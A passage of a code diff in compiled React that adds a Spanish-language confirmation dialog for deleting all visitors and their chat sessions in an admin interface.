         onConfirm: confirmDeleteUser,
         onCancel: cancelDeleteUser,
         loading: loadingDelete,
+        variant: "danger"
+      }
+    ),
+    /* @__PURE__ */ jsxRuntimeExports.jsx(
+      ConfirmModal,
+      {
+        isOpen: showDeleteAllConfirm,
+        title: "Eliminar todos los visitantes",
+        message: `¿Seguro que deseas eliminar los ${users.length} visitantes y todas sus sesiones de chat? Esta acción no se puede deshacer.`,
+        confirmText: "Eliminar todos",
+        cancelText: "Cancelar",
+        onConfirm: () => confirmDeleteAllUsers(users.map((u) => u.id)),
+        onCancel: cancelDeleteAllUsers,
+        loading: loadingDeleteAll,
         variant: "danger"
       }
     ),
